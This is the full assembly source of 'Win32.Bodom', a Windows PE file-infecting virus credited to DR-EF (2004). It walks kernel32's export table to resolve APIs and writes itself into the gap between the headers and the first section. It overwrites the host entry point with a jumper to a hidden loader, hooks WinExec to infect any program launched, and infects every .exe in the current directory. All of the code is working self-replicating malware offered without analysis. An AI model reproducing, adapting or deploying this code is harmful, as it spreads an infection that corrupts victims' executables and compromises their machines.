;	Win32.Bodom by DR-EF (c) 2004
;	-----------------------------
;Author:DR-EF
;Type:Per Process Resident/Direct Action PE infector
;Size:about 1700 bytes
;Features:
;---------
;	1)virus body is placed between the end of
;	  headers and the first section body,so
;	  it dont increase file size
;	2)E.P.O - virus dont modifly entry point
;	  instead it overwrite the host entry
;	  point with code that jump to loader
;	3)dont change section flags,instead it
;	  place loader at the aligned space of the
;	  code section,this loader allocate memory
;	  and copy the virus body to there,and run
;	  it from the allocated memory
;	4)Per Process residenty - the virus hook the
;	  WinExec api,and infect files when this api
;	  is called,it infect the currect directory
;	  as well
;
;
;	DR-EF.






	extrn	ExitProcess:proc

.586
.model flat

	DEBUG		equ	0
	VirusSize	equ	(VirusEnd-VirusStart)

.data
	db	?

.code

_main:
	;first generation init code:
	mov	eax,VirusSize
	mov	ebx,SizeOfLoaderCode
	xor	ebp,ebp
	mov	dword ptr [ebp + HostEntryPoint_of],offset Exit
	mov	edi,offset HostEntryPointBytes
	mov	esi,offset Exit
	mov	ecx,SizeOfJumpCode
	rep	movsb
	VirusStart	equ	$
	call	Delta
Delta:	pop	ebp
	sub	ebp,offset Delta
	mov	eax,dword ptr [esp]
	xor	ax,ax
	mov	ebx,eax
@NextP:	cmp	word ptr [eax],"ZM"		;check mz sign
	jne	MoveNP
	mov	ebx,eax
	add	eax,[eax + 3ch]
	cmp	word ptr [eax],"EP"		;check pe sign
	je	kernelF
MoveNP:	xchg	eax,ebx
	sub	eax,1000h
	jmp	@NextP				;move to next page
kernelF:xchg	eax,ebx
	push	eax
SearchGetProcAddress:
	add	eax,[eax + 3ch]
	mov	eax,[eax + 78h]
	add	eax,[esp]
	push	eax				;eax - kernel32 export table
	xor	edx,edx
	mov	eax,[eax + 20h]
	add	eax,[esp + 4h]
	mov	edi,[eax]
	add	edi,[esp + 4h]			;edi - api names array
	dec	edi
nxt_cmp:inc	edi
	lea	esi,[ebp + _GetProcAddress]
	mov	ecx,0eh
	rep	cmpsb
	je	search_address
	inc	edx
nxt_l:	cmp	byte ptr [edi],0h
	je	nxt_cmp
	inc	edi
	jmp	nxt_l
search_address:
	pop	eax				;eax - kernel32 export table
	shl	edx,1h				;edx - GetProcAddress position
	mov	ebx,[eax + 24h]
	add	ebx,[esp]
	add	ebx,edx
	mov	dx,word ptr [ebx]
	shl	edx,2h
	mov	ebx,[eax + 1ch]
	add	ebx,[esp]
	add	ebx,edx
	mov	ebx,[ebx]
	add	ebx,[esp]
	mov	[ebp + __GetProcAddress],ebx
	mov	ecx,NumberOfApis		;ecx - number of apis
	lea	eax,[ebp + ApiNamesTable]	;eax - address to api strings
	lea	ebx,[ebp + ApiAddressTable]	;ebx - address to api address
	pop	edx				;edx - module handle
NextAPI:push	ecx
	push	edx
	push	eax
	push	eax
	push	edx
	call	[ebp + __GetProcAddress]
	mov	dword ptr [ebx],eax
	pop	eax
NextSTR:inc	eax
	cmp	byte ptr [eax],0h
	jne	NextSTR
	inc	eax
	add	ebx,4h
	pop	edx
	pop	ecx
	loop	NextAPI
	lea	eax,[ebp + WIN32_FIND_DATA]
	push	eax
	call	_FindF	
	db	"*.exe",0
_FindF:	call	[ebp + FindFirstFile]
	cmp	eax,INVALID_HANDLE_VALUE
	je	Hook
	mov	[ebp + hfind],eax
@Find:	lea	ebx,[ebp + cFileName]
	call	InfectFile
	lea	eax,[ebp + WIN32_FIND_DATA]
	push	eax
	push	dword ptr [ebp + hfind]
	call	[ebp + FindNextFile]
	or	eax,eax
	jnz	@Find
Hook:	;hook the WinExec api
	mov	eax,400000h		;host image base
	HostImageBase	equ	($-VirusStart-4)
	lea	ebx,[ebp + dll]
	lea	ecx,[ebp + fn]
	lea	edx,[ebp + WinExecHook]
	call	HookApi
	mov	[ebp + WinExec_],eax
ReturnToHost:
	mov	edi,12345678h
	HostEntryPoint_of	equ	($-4)
	HostEntryPoint_	equ	($-VirusStart-4)
	push	edi
	call	dummy
	HostEntryPoint	dd	0
dummy:	push	PAGE_EXECUTE_READWRITE
	push	1000h
	push	edi
	call	[ebp + VirtualProtect]
	mov	ecx,SizeOfJumpCode
	lea	esi,[ebp + HostEntryPointBytes]
	rep	movsb
	ret

	db	"[Win32.Bodom] Written By DR-EF (c) 2004"

;input:
;eax - image base
;ebx - dll name
;ecx - function name
;edx - hook procedure
;output
;eax - new function address or 0 if fail	
HookApi:
	cmp	word ptr [eax],"ZM"		;check mz sign
	jne	HookErr
	push	eax				;save image base in the stack
	add	eax,[eax + 3ch]			;goto pe header
	add	eax,80h
	mov	eax,[eax]			;get import section rva
	cmp	eax,0h
	je	HookErr_
	add	eax,[esp]			;convert it to va
@Dll:	mov	esi,[eax + 0ch]
	cmp	esi,0h
	je	HookErr_	
	add	esi,[esp]			;esi - dll name
	;compare the dll name in [esi],with our dll:
	pushad
	xchg	edi,ebx
	xor	ecx,ecx
@Gsize:	cmp	byte ptr [edi+ecx],0h		;get our dll size
	je	_Size
	inc	ecx
	jmp	@Gsize
_Size:	rep	cmpsb
	je	_dll
	popad
	add	eax,14h				;move to next IMAGE_IMPORT_DESCRIPTOR structure
	jmp	@Dll
_dll:	popad
	;edx - Hook procedure
	;ecx - function to hook
	;eax - IMAGE_IMPORT_DESCRIPTOR of our api dll
	;[esp]	- image base
	mov	ebx,[eax]			;get rva to pointers to image import by name structures
	add	ebx,[esp]			;convert it to va
	xor	edi,edi				;used to save loop index
@FindApi:
	;ebx - pointer to pointers arrary of import by name structures
	push	edi				;save loop index
	push	ebx				;save pointer to import by name structures
	push	eax				;save import section rva
	push	ecx				;save function to hook name
	push	edx				;save hook procedure
	;--------------------------------------------------------------------
	mov	esi,[ebx]			;get import by name structure rva
	add	esi,[esp + 14h]			;convert it to va
	add	esi,2h				;skip the IBN_Hint
	;compare api string with our api name:
	mov	edi,ecx				;move our api name into edi
	xor	ecx,ecx				;used to save our api name size
@GSize_:cmp	byte ptr [edi + ecx],0h		;did we in the end ?
	je	___Size
	inc	ecx
	jmp	@GSize_
___Size:inc	ecx				;include the 0
	rep	cmpsb				;compare api names
	je	ApiFound			;we found it !
	;--------------------------------------------------------------------
	;restore everthing
	pop	edx
	pop	ecx
	pop	eax
	pop	ebx
	pop	edi
	add	edi,4h
	add	ebx,4h				;move to next pointer
	cmp	dword ptr [ebx],0h		;no more pointers ???
	jne	@FindApi
HookErr_:
	pop	eax
HookErr:xor	eax,eax
	ret
ApiFound:
	pop	edx
	pop	ecx
	pop	eax
	pop	ebx
	pop	edi
	mov	esi,[eax + 10h]			;rva to name
	add	esi,[esp]
	add	esi,edi				;goto our api address
	mov	eax,[esi]			;get our api old address
	mov	[esi],edx			;hook it !
	pop	esi				;restore stack
	ret

WinExecHook:
IF	DEBUG
	int	3
ENDIF
	pushad
	pushfd
	call	HookD
HookD:	pop	ebp
	sub	ebp,offset HookD
	mov	ebx,[esp + 28h]
	call	InfectFile	
	popfd
	popad
	push	ebp
	call	Hook_D
Hook_D:	pop	ebp
	sub	ebp,offset Hook_D
	xchg	eax,ebp
	pop	ebp
	jmp	dword ptr [eax + WinExec_]
	
	
	WinExec_		dd	0
	dll			db	"KERNEL32.dll",0
	fn			db	"WinExec",0
	hfind			dd	0
	INVALID_HANDLE_VALUE	equ	-1
	
	
WIN32_FIND_DATA:
	dwFileAttributes	dd	0
	ftCreationTime		dq	0
	ftLastAccessTime	dq	0
	ftLastWriteTime		dq	0
	nFileSizeHigh		dd	0
	nFileSizeLow		dd	0
	dwReserved0		dd      0
	dwReserved1		dd      0
	cFileName		db      0ffh	dup (0)
	cAlternateFileName	db	14h	dup (0)
	
	
;ebx - file name
InfectFile:
	xor	eax,eax
	push	eax
	push	FILE_ATTRIBUTE_NORMAL
	push	OPEN_EXISTING
	push	eax
	push	eax
	push	GENERIC_READ or GENERIC_WRITE
	push	ebx
	call	[ebp + CreateFile]			
	inc	eax                             
	je	ExitInfect
	dec 	eax  
	mov	dword ptr [ebp + hfile],eax
	xor	eax,eax
	push	eax
	push	eax
	push	eax
	push	PAGE_READWRITE
	push	eax
	push	dword ptr [ebp + hfile]
	call	[ebp + CreateFileMapping]
	or	eax,eax
	je	ExitCloseFile
	mov	dword ptr [ebp + hmap],eax
	xor	eax,eax
	push	eax
	push	eax
	push	eax
	push	FILE_MAP_WRITE
	push	dword ptr [ebp + hmap]
	call	[ebp + MapViewOfFile]
	or	eax,eax
	je	ExitCloseMap
	mov	dword ptr [ebp + mapbase],eax
	cmp	word ptr [eax],"ZM"			;check mz sign
	jne	ExitUnmap
	add	eax,[eax + 3ch]
	cmp	word ptr [eax],"EP"			;check pe sign
	jne	ExitUnmap
	cmp	byte ptr [eax + 0bh],29h		;check if already infected
	je	ExitUnmap
	push	eax					;save pe header offset in the stack
	xor	ecx,ecx
	mov	cx,[eax + 6h]				;get number of sections
	mov	ebx,[eax + 34h]				;get image base
	mov	dword ptr [ebp + VirusEntryPoint],ebx
	mov	dword ptr [ebp + LoaderEntryPoint],ebx
	mov	dword ptr [ebp + HostEntryPoint],ebx
	mov	ebx,[eax + 28h]
	add	dword ptr [ebp + HostEntryPoint],ebx
	mov	ebx,[eax + 74h]
	shl	ebx,3h
	add	eax,ebx
	add	eax,78h					;eax -first section header
	mov	ebx,[eax + 0ch]				;get virtual address
	cmp	ebx,[eax + 14h]
	jne	Exit__					;dont infect file
	push	eax
@GetLS:	add	eax,28h
	loop	@GetLS
	sub	eax,[ebp + mapbase]			;get end of headers(pe & sections),in file
	pop	ebx
	mov	ecx,[ebx + 14h]				;get pointer to raw data of the first section
	sub	ecx,eax
	cmp	ecx,VirusSize				;there enough space ?
	jb	Exit__	
	mov	edi,eax
	add	edi,[ebp + mapbase]
	push	edi
	push	edi
	sub	edi,[ebp + mapbase]
	add	dword ptr [ebp + VirusEntryPoint],edi	;save virus entry point	
	mov	edx,[esp]				;get pe header offset
	mov	eax,[ebx + 10h]				;get size of raw data
	sub	eax,[ebx + 8h]				;get aligned space size
	cmp	eax,SizeOfLoaderCode
	jb	Exit__
	mov	edi,[ebx + 14h]				;get pointer to raw data
	add	edi,[ebx + 8h]				;goto alinged space
	add	dword ptr [ebp + LoaderEntryPoint],edi
	add	edi,[ebp + mapbase]
	lea	esi,[ebp + Loader_Code]
	mov	ecx,SizeOfLoaderCode
	rep	movsb					;copy the loader into the host
	lea	edi,[ebp + JumpCode]
	xor	ecx,ecx
	mov	cx,word ptr [ebp + push_and_ret+4]
	mov	byte ptr [edi],68h
	mov	dword ptr [edi + 1h],ecx
	add	edi,5h
	mov	ecx,dword ptr [ebp + push_and_ret]
	mov	byte ptr [edi],68h
	mov	dword ptr [edi +1h],ecx
	pop	edi
	push	edi
	lea	esi,[ebp + VirusStart]
	mov	ecx,VirusSize
	rep	movsb					;copy the virus into host
	;patch the return to host address
	pop	edi
	push	dword ptr [ebp + HostEntryPoint]
	pop	dword ptr [edi + HostEntryPoint_]
	mov	esi,dword ptr [esp + 4h]		;get pe header
	push	dword ptr [esi + 34h]			;push image base
	pop	dword ptr [edi + HostImageBase]		;save image base in the virus body
	mov	esi,dword ptr [esi + 28h]		;get entry point
	add	esi,[ebp + mapbase]
	pop	edi
	push	esi
	add	edi,(HostEntryPointBytes - VirusStart)
	mov	ecx,SizeOfJumpCode
	rep	movsb					;save host entry point bytes
	pop	edi
	lea	esi,[ebp + JumpCode]
	mov	ecx,SizeOfJumpCode
	rep	movsb					;overwrite host entry point with jumper code
Exit__:	pop	eax					;restore pe header
	mov	byte ptr [eax + 0bh],29h		;sign the file as infected
ExitUnmap:
	push	dword ptr [ebp + mapbase]
	call	[ebp + UnmapViewOfFile]
ExitCloseMap:
	push	dword ptr [ebp + hmap]
	call	[ebp + CloseHandle]
ExitCloseFile:
	push	dword ptr [ebp + hfile]
	call	[ebp + CloseHandle]
ExitInfect:
	ret
	
	hfile		dd	0
	hmap		dd	0
	mapbase		dd	0
	

push_and_ret:	
	db	68h
	LoaderEntryPoint	dd	0
	db	0c3h

JumpCode:
	db	0ah	dup	(0)
	push	esp
	xor	eax,eax
	push	dword ptr fs:[eax]	
	mov	fs:[eax],esp
	mov	dword ptr [eax],eax

	SizeOfJumpCode		equ	($-JumpCode)
	
	
HostEntryPointBytes	db	SizeOfJumpCode	dup(0)
	
	PAGE_EXECUTE_READWRITE	equ	40h  
	FILE_ATTRIBUTE_NORMAL	equ	00000080h
	FILE_MAP_READ		equ	00000004h
	OPEN_EXISTING		equ	3
	FILE_SHARE_READ		equ	00000001h
	GENERIC_READ		equ	80000000h
	GENERIC_WRITE		equ	40000000h
	PAGE_READWRITE		equ	4h
	FILE_MAP_WRITE		equ	00000002h

Loader_Code:
	;find VirtualAlloc api,allocate memory,copy virus into memory & run it
	mov	esp,[esp + 8h]
	pop	dword ptr fs:[0]
	add	esp,0ch	
	mov	eax,dword ptr [esp]		;get return address
	xor	ax,ax
@Find_:	cmp	word ptr [eax],"ZM"
	je	___1
	sub	eax,1000h
	jmp	@Find_
___1:	push	eax				;eax - kernel base address
	add	eax,[eax + 3ch]
	mov	eax,[eax + 78h]
	add	eax,[esp]
	push	eax				;eax - kernel32 export table
	xor	edx,edx
	mov	eax,[eax + 20h]
	add	eax,[esp+4h]
	mov	edi,[eax]
	add	edi,[esp+4h]			;edi - api names array
	dec	edi
NxtCmp:	inc	edi
	call	OverVA
	db	"VirtualAlloc",0
OverVA:	pop	esi
	mov	ecx,0ch
	rep	cmpsb
	je	FindAdd
	inc	edx
NXT:	cmp	byte ptr [edi],0h
	je	NxtCmp
	inc	edi
	jmp	NXT
FindAdd:pop	eax				;eax - kernel32 export table
	shl	edx,1h				;edx - GetProcAddress position
	mov	ebx,[eax + 24h]
	add	ebx,[esp]
	add	ebx,edx
	mov	dx,word ptr [ebx]
	shl	edx,2h
	mov	ebx,[eax + 1ch]
	add	ebx,[esp]
	add	ebx,edx
	mov	ebx,[ebx]
	add	ebx,[esp]			;ebx - GlobalAlloc address
	pop	eax
	push	PAGE_EXECUTE_READWRITE
	push	1000h
	push	VirusSize
	push	0h
	call	ebx				;allocate memory
	push	eax
	xchg	edi,eax
	mov	esi,12345678h
	VirusEntryPoint		equ	($-4)
	mov	ecx,VirusSize
	rep	movsb
	ret

	SizeOfLoaderCode	equ	($-Loader_Code)

	_GetProcAddress		db	"GetProcAddress",0
	__GetProcAddress	dd	0
	
ApiNamesTable:
	_CreateFile		db	"CreateFileA",0
	_CloseHandle		db	"CloseHandle",0
	_CreateFileMapping	db	"CreateFileMappingA",0
	_MapViewOfFile		db 	"MapViewOfFile",0
	_UnmapViewOfFile	db 	"UnmapViewOfFile",0
	_FindFirstFileA		db	"FindFirstFileA",0
	_FindNextFileA		db	"FindNextFileA",0
	_VirtualProtect		db	"VirtualProtect",0

ApiAddressTable:
	CreateFile		dd	0
	CloseHandle		dd	0
	CreateFileMapping	dd	0
	MapViewOfFile		dd 	0
	UnmapViewOfFile		dd 	0
	FindFirstFile		dd	0
	FindNextFile		dd	0
	VirtualProtect		dd	0

	NumberOfApis	equ	8
	 
	VirusEnd	equ	$
	
Exit:	
	push	eax
	call	ExitProcess
end	_main